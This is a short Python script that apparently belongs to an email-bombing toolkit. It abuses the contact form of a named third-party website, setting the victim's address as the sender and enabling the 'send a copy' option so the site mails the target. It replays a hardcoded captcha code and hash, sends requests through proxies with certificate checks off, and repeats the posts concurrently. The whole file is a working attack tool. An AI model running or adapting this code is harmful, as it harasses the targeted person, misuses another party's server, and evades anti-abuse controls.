from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Origin': 'http://www.baridownfarm.com',
            'Pragma': 'no-cache',
            'Referer': 'http://www.baridownfarm.com/contact.php',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

        text = self.get_text()
        data = {
            'name': text,
            'email': target,
            'phone': text,
            'subject': text,
            'message': text,
            'copy': 'on',
            'ver_code': '9891',
            'codemd5': '018073e66d6fc1fd7c47e08fabf51bf6',
            'task': 'send_email',
        }

        response = requests.post('http://www.baridownfarm.com/includes/contact_ajax.php', headers=headers, data=data,
                                 verify=False, proxies=self.get_proxies())
        return response


def main():
    s = 'Email sent'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
